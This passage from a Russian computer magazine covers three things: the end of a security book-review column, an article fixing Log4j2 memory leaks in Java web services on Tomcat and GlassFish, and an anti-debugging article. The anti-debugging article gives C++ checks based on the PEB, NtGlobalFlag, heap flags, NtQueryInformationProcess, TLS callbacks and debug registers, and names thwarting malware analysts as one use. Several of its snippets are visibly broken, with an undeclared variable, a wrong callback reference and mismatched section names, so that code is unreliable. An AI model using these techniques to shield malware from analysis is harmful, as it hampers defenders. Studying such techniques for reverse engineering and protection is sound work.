   ких  уроков).  В  результате  в  команде  увеличивается  прозрачность
  и доверие — что очень благотворно ска зывается на способности чле нов
  команды сотрудничать друг с дру гом.
     Таково крат кое содержание книги. Теперь можешь встать и спеть свой
  корпоративный гимн, даже если никто не слышит. :)


  «ЖЕЛТАЯ ПАУТИНА»: КЛАССИЧЕСКАЯ ПОДБОРКА УЯЗВИМОСТЕЙ
  ВСЕМИРНОЙ ПАУТИНЫ


  Michal Zalewski. The Tangled Web:
  A guide to Securing Modern Web Ap-
   plications. 2012. 300 p.
  Всего каких‐нибудь двадцать лет назад
  интернет был настолько же прос тым, нас‐
  колько и бесполезным. Он представлял
  собой причудливый механизм, поз воля‐
  ющий небольшой кучке сту дентов и вун‐
  деркиндов посещать домашние стра нич‐
   ки друг друга. Подавляющее большинс тво
   таких страничек было посвящено науке,
  домашним питомцам и поэзии.
     Архитектурные изъяны и недостатки
  реализации     всемирной     паутины,
  с которыми нам приходится мириться
  сегодня, — плата за исто ричес кую неп‐
  редусмотрительность. Ведь это была тех‐
   нология, которая никогда не стремилась к тому глобальному статусу, который
  она получила сегодня. В итоге мы имеем очень уязвимую киберинфраструк‐
   туру: как выяснилось, стандарты, дизайн и про токолы всемирной паутины,
  которых было достаточ но для домашних стра ничек с танцующими хомяками,
  совершенно недостаточно, скажем, для интернет‐магазина, который ежегод‐
  но обрабатывает миллионы транзакций по кредитным картам.
     Оглядываясь на прошлые два десят ка лет, трудно не разочароваться:
  практически каждое сколь‐нибудь полезное web‐при ложе ние, разработанное
  до сегодняшнего дня, было вынуждено зап латить кровавую цену за непредус‐
  мотрительность вчерашних архитекторов всемирной паути ны. Мало того что
  интернет оказался куда более вос требованным, чем это ожидалось, так мы
  еще и закрывали глаза на отдельные неудобные его характеристики, которые
  выходили за пределы зоны нашего комфорта. И ладно бы закрывали глаза
  в прошлом — мы продолжаем закрывать их и сейчас… Более того, даже
  очень хорошо спроектированные и тщательно про веренные веб‐приложе ния
  все равно имеют гораздо больше проблем, чем их несетевые собратья.
      Итак, мы порядком наломали дров. Пришло время покаяться. В целях
   такого пока яния эта книга и была написана. Это первая (и на данный момент
   лучшая в своем роде) книга, которая предос тавля ет сис темати ческий и тща‐
   тельный анализ текущего  (ну  как «текущего», это скорее клас сика —
  2012  год. —  Прим.  ред.)  состояния  безопас ности  веб‐приложений.
  Для такого сравнительно небольшого объема текста количество рас смот‐
  ренных нюансов просто ошеломитель ное. Более того, инженеры‐безопас‐
   ники, ищущие быстрых решений, пораду ются наличию чит‐лис тов, которые
  можно найти в конце каждого раз дела. В этих чит‐листах описываются
  эффективные подходы для решения наиболее злободневных проблем,
  с которыми сталкивается разработчик веб‐приложений.


  «КОРИЧНЕВАЯ КНИГА»: КНИГА «БАГОБОРЦА»


  Tobias Klein. A Bug Hunter ‘s Diary:
  A Guided Tour Through the Wilds
  of Software Security. 2011. 208 p.
  Одна из интереснейших книг, вышедших
  за  последнее  десятилетие. Ее  посыл
  можно резюмировать следующими сло‐
  вами: «Дайте человеку экспло ит, и вы
  сделаете  его хакером на один  день,
  научите его эксплуатировать ошибки —
  и он останется хакером на всю жизнь».
  Читая «Дневник багоборца», ты прос леду‐
  ешь за практикующим экспертом кибер‐
  безопасности, который выявляет ошиб ки
  и эксплуатирует их в самых популярных
  на сегодняшний день приложениях, таких
   как Apple iOS, VLC‐медиаплеер, веб‐бра‐
   узеры и даже ядро Mac OS X. Читая эту
  уникальную в сво ем роде книгу, ты получишь глу бокие технические знания
  и понимание того, какой у хакеров подход к трудноразрешимым проблемам,
  а также в каком экстазе они находятся в процессе охоты на баги.
    Из книги ты узнаешь:
   • как пользоваться проверенными временем методами поис ка  багов,
     такими как трассировка вводимых пользователем данных и реверс‐инжи‐
     ниринг;
   • как эксплуатировать уяз вимос ти, такие как разыменование NULL‐указате‐
      лей, переполнение буфера, огрехи преобразования типов;
   • как писать код, демонстрирующий наличие уязвимости;
   • как грамотно уведомлять вендоров о выявленных в их софте багах.

  «Дневник багобор ца» испещрен реальными при мерами уязвимого кода
  и авторскими программа ми, раз работанными для облегчения поиска багов.
     Ради какой бы цели ты ни охотился за багами, будь то развлечение,
  заработок или же альтруистичес кое стремление сделать мир более безопас‐
  ным, эта книга поможет раз вить ценные навыки, поскольку с ее помощью ты
   заглядываешь через плечо профес сионала‐багоборца, и не только на экран
  его монитора, но и в его голову. Максимальную отдачу от книги получат те,
   кто хорошо знаком с языком программирования C/C++ и x86‐ассемблером.


  «КНИГА ВОЗМЕЗДИЯ»: БИБЛИЯ БЕЗОПАСНОЙ РАЗРАБОТКИ КОДА


  Michael Howard, David LeBlanc, John
  Viega. 24 Deadly Sins of Software
   Security: Programming Flaws
  and How to Fix Them. 2010. 394 p.
  Сегодня любой разработ чик софта прос‐
   то обязан обладать навыками написа ния
  безопасного  кода.  Эта  книга  вскры‐
   вает 24 принципиальных момента, очень
  некомфортных для разработчиков софта.
  Некомфортных в том плане, что разработ‐
  чики практически всегда допускают тут
  серьезные огрехи. В книге представлены
  практические  советы,  каким  образом
  при  разработке софта  избежать  этих
  огрехов  и  как  протес тировать  на  их
  наличие уже име ющийся софт, написан‐
  ный другими людьми. Повествование кни‐
   ги простое, доступное и основательное.
     Эта книга будет ценной находкой для любого разработчика, независимо
   от языка, который он использует. Она будет полез на всем тем, кто заин‐
  тересован в разработке качественного, надежного и безопас ного кода.
  В книге наглядно продемонстрированы наиболее распространенные и опас‐
  ные огрехи сразу для нескольких языков (C++, C#, Java, Ruby, Python, Perl,
  PHP и другие), а также приведены проверенные временем и хорошо зареко‐
  мендовавшие себя техники, поз воляющие искупить грехи долгих лет косяч‐
   ного, небезопасного программирова ния. :)
     Руководители некоторых софтверных компаний используют  эту книгу
  для проведения блиц‐тренингов непосредс твенно перед началом разработ‐
   ки нового софта. Обязывают разработ чиков прочитать из этой книги раз делы,
   затрагивающие технологии, с которыми им предстоит иметь дело. Книга раз‐
  бита на четыре «греховных» раздела, посвященных веб‐софту, разработке,
  криптографии и сетевым проблемам.
КОДИНГ





                                                                   Андрей Буров
                                                                                  andreyburov@syberia.netJAVA
ПРОТИВ УТЕЧЕК

METRO И LOG4J2 В ВЕБ‐СЛУЖБЕ:
БОРЕМСЯ С MEMORY LEAKS




В прошлой статье мы рассмотрели утечки памяти, которые
возникают при остановках и переустановках веб‐приложе‐
ний, написанных на Java. Речь шла о выводе логов Spring
через Log4j2. Я показывал, каким обра зом нужно настроить
веб‐приложение так, чтобы контекст логгера уничтожался
в последнюю очередь, после контекста Spring.


К сожалению, «весенний» фреймворк — не единс твенная  технология,
с которой могут возникнуть подобные проблемы. Сей час я расскажу, как мож‐
но легко и просто получить утечки памяти, используя Log4j2 в веб‐службах,
и на этот раз конец истории будет не таким радужным.
   Если ты в курсе, о чем речь, и тебе зна кома эта тема, то устраивайся
поудобнее и читай даль ше. Если же нет, то советую сначала прочитать пер‐
вую статью: она введет тебя в курс дела. Далее я буду исходить из того, что ты
так и поступил. :)


ПОДГОТАВЛИВАЕМ ОКРУЖЕНИЕ
Если ты когда‐нибудь раз рабатывал веб‐службы на Java, то с очень большой
вероятностью использовал для это го биб лиотеки Metro. Обычно их даже
не нужно явно подклю чать в про ект: они могут быть установлены в контейнере
сервлетов.  На   стра нице   https://javaee.github.io/metro/download   есть
руководство по установке Metro в Apache Tomcat и GlassFish.
   Установка для Tomcat довольно прос та: необ ходимо выполнить ant‐сце‐
нарий metro‐on‐tomcat.xml, после чего в его кор невой директории в папке
shared\lib появятся четыре новых файла: webservices‐extra.jar, webser‐
vices‐extra‐api.jar, webservices‐rt.jar, webservices‐tools.jar, а в
папке endorsed — файл webservices‐api.jar. В случае с GlassFish и вовсе
ничего делать не нужно: для него Metro поставляется «из коробки».
   Если ты все сделал по инструкции, то мы можем приступить к раз работке
простой веб‐службы и на ее примере изу чать поведение обоих сервлет‐кон‐
тейнеров. Также нелишним будет заранее предупредить, дорогой читатель,
что в этой статье тебя ждет на порядок более глубокое погружение в дебри
«кошачьего» и «рыбьего» прог раммного кода. Если тебя это не пугает и ты
готов к сложностям, то предлагаю сварить кофе покрепче, открыть любимую
IDE и погрузиться в мир Java.


РАЗРАБАТЫВАЕМ SOAP-СЛУЖБУ
Чтобы создать простейшую веб‐службу, требует ся написать всего несколько
строк кода:


@WebService(serviceName = "MyWebService")
public class MyWebService {
    @WebMethod
    public void myWebMethod() {
        // no operation
    }
}

Здесь мы объявили службу MyWebService с единс твенным методом myWeb‐
Method. Создадим для нее также дескриптор раз верты вания sun‐jaxws.xml:


<?xml version="1.0" encoding="UTF‐8"?>
<endpoints version="2.0" xmlns="http://java.sun.com/xml/ns/jax‐ws/ri/
runtime">
    <endpoint name="MyWebService"
              implementation="net.syberia.memoryleaks.metrolog4j2.
MyWebService"
              url‐pattern="/MyWebService" />
</endpoints>

С его помощью мы говорим библиотеке Metro о том, что у нас есть веб‐служ‐
ба под названием MyWebService, которая реализова на в классе net.sybe‐
ria.memoryleaks.metrolog4j2.MyWebService, и ее следует развернуть
по адресу /MyWebService. Таким образом, если наше веб‐приложение будет
называться, к примеру, metro‐log4j2‐memory‐leaks, то после публикации
служба будет доступна по адресу http://localhost:8080/metro‐log4j2‐memory‐
leaks/MyWebService (разумеется, если сервлет‐контейнер поднят на твоей
локальной машине).
  В Tomcat и GlassFish веб‐приложения пуб ликуются достаточно просто
через административные панели в браузере. Инструкции можно найти здесь
и здесь.
  Работу нашей службы можно проверить, например, с помощью прог‐
раммы SoapUI. Если скормить ей адрес WSDL http://localhost:8080/metro‐
log4j2‐memory‐leaks‐1.0/MyWebService?wsdl и отпра вить такой запрос:


<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/
envelope/" xmlns:met="http://metrolog4j2.memoryleaks.syberia.net/">
    <soapenv:Header/>
    <soapenv:Body>
        <met:myWebMethod/>
    </soapenv:Body>
</soapenv:Envelope>

то получим ответ:


<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
    <S:Body>
        <myWebMethodResponse xmlns="http://metrolog4j2.memoryleaks.
syberia.net/"/>
    </S:Body>
</S:Envelope>

Таким образом мы можем убедиться, что прог рамма работает.
   Если бы это было краткое руководство о том, как делать свои собственные
службы, то на этом мы могли бы и закончить… Однако мы не ищем легких
путей: нашему детищу нужно логиро вание! Иначе как ты будешь разбираться,
почему упал продакшен в два часа ночи?


СОЗДАЕМ УТЕЧКИ ПАМЯТИ
Добавить логгер Log4j2 в класс MyWebService очень легко:


@WebService(serviceName = "MyWebService")
public class MyWebService {
    private static final Logger LOGGER = LogManager.getLogger(MyWebS
ervice.class);
    @WebMethod
    public void myWebMethod() {
        // no operation
    }
}

Код выглядит просто и стандартно. Одна ко теперь, если собрать и опуб‐
ликовать эту службу, получим утечки памяти, хотя мы просто соз дали объект
LOGGER и даже нигде его не использовали! Еще более странно, что если
в случае с Tomcat утечки появляются при каж дой остановке/переустановке
службы, то в GlassFish они воз никают случай ным образом.
   Это означает, что если сегодня ты накатил новую версию своего приложе‐
ния на сервер без утечек памяти, то вовсе не факт, что тебе повезет завтра.
Похоже на какую‐то чертовщину. Давай пос тараемся разобраться, почему так
происходит.


УТЕЧКА В APACHE TOMCAT
Очевидно, что утечку каким‐то образом вызвал статический метод LogManag‐
er.getLogger, так как при объ явлении логгера вызывается только он. В свою
очередь, создание объекта LOGGER могло спровоцировать обращение к клас‐
су MyWebService. Мы можем проверить это, если, например, поставим точку
останова (breakpoint) внутри конс труктора нашего класса:


@WebService(serviceName = "MyWebService")
public class MyWebService {
    private static final Logger LOGGER = LogManager.getLogger(MyWebS
ervice.class);
    public MyWebService() {
        System.out.println("My breakpoint here");
    }
    @WebMethod
    public void myWebMethod() {
        // no operation
    }
}

После этого запустим приложение в режиме отладки и, когда наш breakpoint
сработает, откроем стек вызовов. В NetBeans IDE он выглядит как на сле‐
дующем скрине.





                            Стек вызовов

Здесь мы видим, что класс StandardContext Tomcat вызывает WSServletCon‐
tainerInitializer из библиотеки Metro, который, в свою очередь, создает экзем‐
пляр нашего MyWebService. Мож но предположить, что это происходит рань‐
ше, чем инициализация логгера в Log4jServletContainerInitializer.
   Чтобы проверить это, можно подклю чить к проекту исходные коды Tomcat.
Для тестов будем исполь зовать версию 8.5.23:


<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat‐catalina</artifactId>
    <version>8.5.23</version>
    <scope>provided</scope>
</dependency>

Теперь если в режиме отладки перейти на стро ку под номером 5196 в Stan‐
dardContext, то увидим такое:


...
for (Map.Entry<ServletContainerInitializer, Set<Class<?>>> entry :
    initializers.entrySet()) {
    try {
        entry.getKey().onStartup(entry.getValue(),
              getServletContext());
    }
...

Здесь происходит последовательный вызов в цикле всех элементов ассо‐
циативного массива initializers, который имеет реализацию  Linked‐
HashMap. Это означает, что порядок элементов в мас сиве будет неиз‐
менным: в какой последовательности их в него помес тили, в той же они будут
извлекаться.
   Если посмотрим на содержимое initializers, то увидим, что наше пред‐
положение было верно: логгер инициализируется последним, а значит, мы
нашли причину утечек памяти. Проблема вроде бы похожа на ту, что мы раз‐
бирали в первой статье, но есть серь езные отличия.
 1. Log4jServletContainerInitializer   вызывался   раньше,   чем
   SpringServletContainerInitializer, и это было правильно.
 2. В web.xml был зарегистрирован ContextLoaderListener, что и вызывало
   утечку памяти.

Здесь мы не создавали web.xml, да и вооб ще ничего особо криминального
не делали. В чем же причина неверного порядка вызова инициализаторов?
Ответ можно найти, если прос ледить по коду алго ритм запол нения initial‐
izers. Это довольно сложное и долгое упражнение на чтение чужого
исходного кода, которое я здесь описывать не буду, а лишь сообщу результат
своих изысканий: порядок зада ется в методе load класса WebappService‐
Loader.
   Суть алгорит ма сводится к тому, что сначала заг ружаются все ServletCon‐
tainerInitializer Tomcat, а потом самого приложения. При этом инициализаторы
приложения сор тируются только друг отно сительно друга, а в общий Linked‐
HashMap помещаются все равно после инициализато ров Tomcat.
  Поскольку  в нашем примере WSServletContainerInitializer  рас‐
полагается внутри Tomcat, а Log4jServletContainerInitializer — внутри
нашей службы, то web‐fragment.xml с сор тировкой для логгера нам здесь
не помогает.
  Однако в этом же методе можно обна ружить, что у Tomcat есть воз‐
можность отключить инициализаторы по выбору с помощью настройки con‐
tainerSciFilter в файле META‐INF/context.xml. Отключим WSServletCon‐
tainerInitializer:


<Context path="/metro‐log4j2‐memory‐leaks"
         containerSciFilter="com.sun.xml.ws.transport.http.servlet.
WSServletContainerInitializer">
</Context>

Теперь если попробовать запус тить нашу службу, то обнаружим, что она
перестала работать, и этого стоило ожидать. Мы можем ее снова оживить,
если подключим в web.xml класс WSServletContextListener:


<?xml version="1.0" encoding="UTF‐8"?>
<web‐app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema‐instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
http://xmlns.jcp.org/xml/ns/javaee/web‐app_3_1.xsd"
         version="3.1">
    <listener>
        <listener‐class>com.sun.xml.ws.transport.http.servlet.WSServ
letContextListener</listener‐class>
    </listener>
</web‐app>

В итоге служба заработает, а утечка памяти пропадет. Однако сейчас мы
пришли к такой же картине, с которой начина лась первая статья, только вмес‐
то ContextLoaderListener  в  web.xml  зарегистрирован  WSServletCon‐
textListener, а значит, мы дол жны были получить утечку — но ее нет.
   Это объясняется тем, что WSServletContextListener при уничтожении
контекста пишет в лог через JUL и Log4j2 при этом не вызывается повторно.
Но ситуация, когда логгер уничтожается не в последнюю очередь, все же
может быть потенциальной проблемой, и на всякий случай следует явно ука‐
зать Log4jServletContextListener до WSServletContextListener:


<?xml version="1.0" encoding="UTF‐8"?>
<web‐app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema‐instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
http://xmlns.jcp.org/xml/ns/javaee/web‐app_3_1.xsd"
         version="3.1">
    <listener>
        <listener‐class>org.apache.logging.log4j.web.Log4jServletCon
textListener</listener‐class>
    </listener>
    <listener>
        <listener‐class>com.sun.xml.ws.transport.http.servlet.WSServ
letContextListener</listener‐class>
    </listener>
    <context‐param>
        <param‐name>isLog4jAutoInitializationDisabled</param‐name>
        <param‐value>true</param‐value>
    </context‐param>
</web‐app>

Если проверить приложение на утечки памяти, то их по‐прежнему нет:
для пользовате лей Tomcat нашлось прос тое и элегантное решение проб‐
лемы.


УТЕЧКА В GLASSFISH
С GlassFish дела обстоят хуже. Если мы попробу ем вос произвести утечку,
которая была описана выше, то она может проявляться, а может и не про‐
являться — самая настоящая утечка Шрёдин гера. При этом решение проб‐
лемы, которое было верным для Tomcat, совсем не подходит для GlassFish:
в нем нет ничего похожего на нас тройку containerSciFilter. Но ведь дол‐
жен быть какой‐то выход?
   Если порыться в исходном коде этого сервера приложений, то вмес то
такой настройки найдем самый нас тоящий костыль:


...
for (Map.Entry<Class<? extends ServletContainerInitializer>, Set<
Class<?>>> e :
                    initializerList.entrySet()) {
    Class<? extends ServletContainerInitializer> initializer = e.
getKey();
    if (isUseMyFaces() &&
            Globals.FACES_INITIALIZER.equals(initializer.getName()))
{
        continue;
    }
...

То есть при последовательном запуске инициализаторов из ассоциативного
массива initializerList в коде жестко про писано, что фильтруется только
FacesInitializer в случае использования биб лиотеки MyFaces. Других способов
отфильтровать инициализаторы в initializerList найти не удалось.
  Остается еще один вариант: каким‐то обра зом указать верную последова‐
тельность инициализаторов. Но и тут нас ожидает разочарование: initial‐
izerList имеет тип HashMap, который не гарантирует порядок элементов
внутри себя!
   Это и есть причина непостоянс тва утечек: если повезет, то HashMap
выдаст Log4jServletContainerInitializer до WSServletContainerIni‐
tializer, а если не повезет, то получим утечку памяти.
  Обидно? Да. Есть ли еще способы избавиться от утечки, кроме того, чтобы
писать разработчикам? Да… но только если ты готов перейти на темную сто‐
рону силы. Я говорю о «временном» решении, в котором можно объ явить
объект LOGGER нестандартным образом: например, как lazy‐loaded singleton.
Но давай будем честны с собой: как часто наши временные решения ока‐
зываются действительно временными? При мер подобного кода приводить
не буду. На всякий случай.


ВЫВОДЫ
Вывод из всей этой исто рии прост и неутешителен: универсального решения
проблем с такого рода утечками нет. Каждый сервер приложений имеет свои
особенности, и подходить к ним тоже нужно с разных сторон.
   Альтернативным вариантом может быть переход на Spring Boot, но это уже
совсем другая история. :)


        WWW

                    Ссылка на проект
КОДИНГ





     Nik Zerof
xtahi0nix@gmail.com




 АНТИОТЛАДКА
     ТЕОРИЯ И ПРАКТИКА ЗАЩИТЫ
       ПРИЛОЖЕНИЙ ОТ ДЕБАГА





К методам детектирования отладки прибегают многие прог‐
раммисты: одни хотели бы уберечь свои продукты от кон‐
курентов,  другие  противостоят  вирусным  аналитикам
или автоматическим системам распознавания малвари. Мы
в  подробнос тях  рассмотрим  разные  методы  борь бы
с дебагом — от простых до довольно нетривиальных.


Поскольку сейчас популярна не только архи тектура x86, но и x86‐64, многие
старые средства обнаружения отладчиков устарели. Дру гие тре буют кор‐
ректировки, потому что жестко завяза ны на смещения в архитектуре x86.
В этой статье я расскажу о нескольких методах детекта отладчика и покажу
код, который будет работать и на x64, и на x86.


ISDEBUGGERPRESENT() И СТРУКТУРА PEB
Начинать говорить об антиотладке и не упомянуть о функции IsDebuggerPre‐
sent() было бы неправильно. Она универсальна, работает на разных архитек‐
турах и очень проста в использовании. Чтобы определить отладку, достаточно
одной строки кода: if (IsDebuggerPresent()).
   Что представ ляет собой WinAPI IsDebuggerPresent? Эта функция обра‐
щается к структуре PEB.


Process Environment Block
Блок окружения процес са (PEB) заполняется загрузчиком операционной сис‐
темы, находится в адресном пространс тве процесса и может быть модифи‐
цирован из режима usermode. Он содержит много полей: например, отсюда
можно узнать информа цию о текущем модуле, окружении и загруженных
модулях. Получить структуру PEB мож но, обра тившись  к ней напрямую
по адресу fs:[30h] для x86 и gs:[60h] для x64.



Соответственно, если загрузить в отладчик функцию IsDebuggerPresent(),
на x86‐системе мы увидим:


mov     eax,dword ptr fs:[30h]
movzx   eax,byte ptr [eax+2]
ret

А на x64 код будет таким:


mov   rax,qword ptr gs:[60h]
movzx eax,byte ptr [rax+2]
ret

Что значит byte ptr [rax+2]? По этому смещению находится поле Be‐
ingDebugged в структуре PEB, которое и сигнализирует нам о факте отладки.
Как еще можно использовать PEB для обна ружения отладки?


NtGlobalFlag
Во время отладки система выставляет флаги FLG_HEAP_VALIDATE_PARAME‐
TERS, FLG_HEAP_ENABLE_TAIL_CHECK, FLG_HEAP_ENABLE_FREE_CHECK, в поле
NtGlobalFlag, которое находится в структуре PEB. Отладчик использует эти
флаги для контроля разрушения кучи посредс твом переполнения. Битовая
маска флагов — 0x70. Смещение NtGlobalFlag в PEB для x86 составляет
0x68, для x64 — 0xBC. Что бы показать пример кода детекта отладчика по Nt‐
GlobalFlag, воспользуемся функциями intrinsics, а чтобы код был более уни‐
версальным, используем директивы препроцессора:


#ifdef _WIN64
DWORD pNtGlobalFlag = NULL;
PPEB pPeb = (PPEB)__readgsqword(0x60);
pNtGlobalFlag = *(PDWORD)((PBYTE)pPeb + 0xBC);
#else
DWORD pNtGlobalFlag = NULL;
PPEB pPeb = (PPEB)__readfsdword(0x30);
pNtGlobalFlag = *(PDWORD)((PBYTE)pPeb + 0x68);
#endif
if ((pNtGlobalFlag & 0x70) != 0) std::cout << "Debugger detected!\n";


Flags и ForceFlags
PEB также содержит указатель на структуру _HEAP, в которой есть поля Flags
и ForceFlags. Когда отладчик подсоединен к приложению, поля Flags
и ForceFlags содержат признаки отладки. ForceFlags при отладке не дол‐
жно быть равно нулю, поле Flags не дол жно быть равно 0x00000002:


#ifdef _WIN64
PINT64 pProcHeap = (PINT64)(__readgsqword(0x60) + 0x30);    \\
Получаем структуру _HEAP через PEB
PUINT32 pFlags = (PUINT32)(*pProcHeap + 0x70);      \\ Получаем Flags
 внутри _HEAP
PUINT32 pForceFlags = (PUINT32)(*pProcHeap + 0x74);     \\ Получаем
ForceFlags внутри _HEAP
#else
PPEB pPeb = (PPEB)(__readfsdword(0x30) + 0x18);
PUINT32 pFlags = (PUINT32)(*pProcessHeap + 0x40);
PUINT32 pForceFlags = (PUINT32)(*pProcessHeap + 0x44);
#endif
if (*pFlags & ~HEAP_GROWABLE || *pForceFlags != 0)
std::cout << "Debugger detected!\n";


CHECKREMOTEDEBUGGERPRESENT() И
NTQUERYINFORMATIONPROCESS
Функция   CheckRemoteDebuggerPresent,   как   и   IsDebuggerPresent,
кросс‐платформенная и проверя ет наличие отладчи ка. Ее отличие от IsDe‐
buggerPresent в том, что она умеет проверять не только свой процесс, но и
другие по их хендлу. Прототип функции выглядит следующим образом:


BOOL WINAPI CheckRemoteDebuggerPresent(
_In_    HANDLE hProcess,
_Inout_ PBOOL  pbDebuggerPresent
);

где hProcess — хендл процесса, который проверяем на предмет подклю‐
чения отладчика, pbDebuggerPresent — результат выпол нения функции
(соответственно, TRUE или FALSE). Но самое важное отличие в работе этой
функции заключается в том, что она не берет информацию из PEB, как IsDe‐
buggerPresent, а исполь зует функцию WinAPI NtQueryInformationProcess.
Прототип функции выглядит так:


NTSTATUS WINAPI NtQueryInformationProcess(
_In_      HANDLE           ProcessHandle,
_In_      PROCESSINFOCLASS ProcessInformationClass,
_Out_     PVOID            ProcessInformation,
_In_      ULONG            ProcessInformationLength,
_Out_opt_ PULONG           ReturnLength
);

Поле, которое поможет нам понять, как работает CheckRemoteDebuggerPre‐
sent, — это ProcessInformationClass, который представляет собой боль‐
шую структуру (enum) PROCESSINFOCLASS с парамет рами. Функция CheckRe‐
moteDebuggerPresent переда ет в это поле значение 7, которое указывает
на ProcessDebugPort. Дело в том, что при подключении отладчика к процес‐
су в структуре EPROCESS запол няется поле ProcessInformation, которое
в коде названо DebugPort.


             INFO

                       Структура EPROCESS, или блок процесса, содер‐
                      жит много информации о процессе, указате ли
                       на несколько структур данных, в том числе и на
                       PEB. Заполняется исполнительной системой ОС,
                       находится в системном адресном пространстве
                          (kernelmode), как и все связанные структуры, кро‐
                    ме PEB. Все процессы име ют эту структуру.


Если поле заполнено и порт отладки наз начен, то принимается решение
о том, что идет отладка. Код для CheckRemoteDebuggerPresent:


BOOL IsDbgPresent = FALSE;
CheckRemoteDebuggerPresent(GetCurrentProcess(), &IsDbgPresent);
if (IsDbgPresent) std::cout << "Debugger detected!\n";

Код передачи параметра ProcessDebugPort напрямую в функцию NtQuery‐
InformationProcess:


Status = NtQueryInfoProcess(GetCurrentProcess(),
7,  // ProcessDbgPort
&DbgPort,
dProcessInformationLength,
NULL);
if (Status == 0x00000000 && DbgPort != 0) std::cout << "Debugger
detected!\n";

Переменная Status имеет тип NTSTATUS и сигнализирует нам об успе хе
или неуспехе выполнения функции; в DbgPort проверяем, назначен порт
или поле нулевое. Если функция отработала без ошибок и вернула ста‐
тус 0 и DbgPort имеет ненулевое зна чение, то порт назначен и идет отладка.


Тон кости NtQueryInfoProcess
Документация MSDN говорит нам, что использовать NtQueryInfoProcess сле‐
дует при помощи динамичес кой линковки, получая ее адрес из ntdll.dll нап‐
рямую, через функции LoadLibrary и GetProcAddress, и определяя про‐
тотип функции вручную при помощи typedef:


 typedef NTSTATUS(WINAPI *pNtQueryInformationProcess)(HANDLE, UINT,
 PVOID, ULONG, PULONG);
 NtQueryInfoProcess = (pNtQueryInformationProcess)GetProcAddress(
 LoadLibrary(_T("ntdll.dll")), "NtQueryInformationProcess");




Но функция NtQueryInformationProcess может показать несколько приз‐
наков отладки, и ProcessDebugPort — только один из них.


DebugObject
При отладке приложения создается DebugObject, объект отладки. Если Nt‐
QueryInformationProcess в поле ProcessInformationClass передать зна‐
чение 0x1E, то оно ука жет на элемент ProcessDebugObjectHandle и при
отработке функции нам будет возвращен хендл объекта отладки. Код похож
на предыдущий с тем отличием, что вмес то 7 в поле ProcessInformation‐
Class передается значение 0x1E и меняется условие проверки:


if (Status == 0x00000000 && hDebObj) std::cout << "Debugger detected!
\n";

где hDebObj — поле ProcessInformation с результатом. Здесь все так же:
функция отработала правильно и вернула 0, hDebObj ненулевой. Значит, объ‐
ект отладки создан.


ProcessDebugFlags
Следующий признак отладки, который нам покажет функция NtQueryInfoPro‐
cess, — это поле ProcessDebugFlags, имеющее номер 0x1F. Передавая зна‐
чение 0x1F, мы заставляем функцию NtQueryInfoProcess показать нам поле
NoDebugInherit, которое находится в структуре EPROCESS. Если поле равно
нулю, это значит, что в данный момент при ложение отлаживается. Код вызова
NtQueryInfoProcess идентичен, меня ем только номер ProcessInforma‐
tionClass и проверку:


if (Status == 0x00000000 && NoDebugInherit == 0) std::cout <<
"Debugger detected!\n";


ПРОВЕРКА РОДИТЕЛЬСКОГО ПРОЦЕССА
Суть этого антиотладочного метода заключа ется в том, что мы должны про‐
верить, кем именно было запущено приложение, которое мы защищаем:
пользователем или отладчиком. Этот спо соб мож но реализовать раз ными
путями — проверить, является ли parent‐про цес сом explorer.exe либо не выс‐
тупает ли в этой роли ollydbg.exe, x64dbg.exe, x32dbg и так далее. Если
попытаться развить логику это го метода обнаружения отладки, то приходит
в голову еще один простой метод — получить снапшот всех процессов в сис‐
теме и сравнить название каждого со списком извес тных отладчиков.
  Проверять родительский про цесс мы будем при помощи уже известной
нам функции NtQueryInformationProcess и структуры PROCESS_BASIC_IN‐
FORMATION (поле InheritedFromUniqueProcessId), а получать список всех
запущенных процессов в системе мож но при помощи CreateToolhelp32S‐
napshot/Process32First/Process32Next. Чтобы не писать не относящийся
к делу код парсинга всех про цес сов в системе, напишем только основной код
получения ID родительского процесса и основную проверку:


PROCESS_BASIC_INFORMATION baseInf;
NtQueryInformationProcess(NtCurrentProcess(), ProcessBasicInformation
, &baseInf, sizeof(baseInf), NULL);

Итак, в baseInf.InheritedFromUniqueProcessId находится ID процесса,
который порождает наш. Его можно использовать как угодно: например,
получить из него имя файла, наз вание про цес са и сравнить с име нами
отладчиков или проверять, не explorer.exe ли это.


TLS CALLBACKS
Этот нетривиальный метод антиотладки заключа ется в том, что мы встра‐
иваем  антиотладоч ные приемы  в TLS  Callbacks, которые выполняются
до входной точки программы. Внутри самого при ложения могут быть установ‐
лены точки останова, да и внимание будет сконцентрировано на основном
коде приложе ния, но этот прием завершит отладку, даже толком ее не начав.
Кто‐то считает этот способ весь ма могучим, но сейчас при правильной нас‐
тройке отладчика процесс отладки может останавливаться при входе в TLS
Callbacks. То есть против матерых реверсеров это не спасет, зато отсеет
много школьников, которые не будут понимать, что происходит. :‐) Чтобы
реализовать этот метод обнаружения, необходимо сказать компилятору соз‐
дать секцию TLS таким кодом:


#pragma comment(linker,"/include:__tls_used")

Секция должна иметь имя CRT$XLY:


#pragma section(".CRT$XLY", long, read)

Сам код имплементации:


void WINAPI TlsCallback(PVOID pMod, DWORD Reas, PVOID Con)
{
if (IsDebuggerPresent()) std::cout << "Debugger detected!\n";
}
__declspec(allocate(".CRT$XLB")) PIMAGE_TLS_CALLBACK CallTSL[] = {
CallTSL,NULL};


ОТЛАДОЧНЫЕ РЕГИСТРЫ
Если в отладочных регис трах есть какие‐то данные, то это еще один признак.
Но дело в том, что отла дочные регистры — привиле гированный ресурс
и получить к ним доступ напрямую мож но только в режиме ядра. Но мы поп‐
робуем получить контекст потока при помощи функции GetThreadContext
и таким образом прочитать данные отладочных регис тров. Всего отладочных
регистров восемь, DR0–DR7. Первые четыре регис тра DR0–DR3 содержат
информацию о точках останова, регис тры DR4–DR5 — зарезервированные,
регистр DR6 заполняется, когда сра ботал брейк‐пойнт отладчика, и содержит
информацию об этом событии. Регистр DR7 содержит биты управления
отладкой. Итак, нам интересно, какая информа ция содержится в первых
четырех регистрах.


CONTEXT context = {};
context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
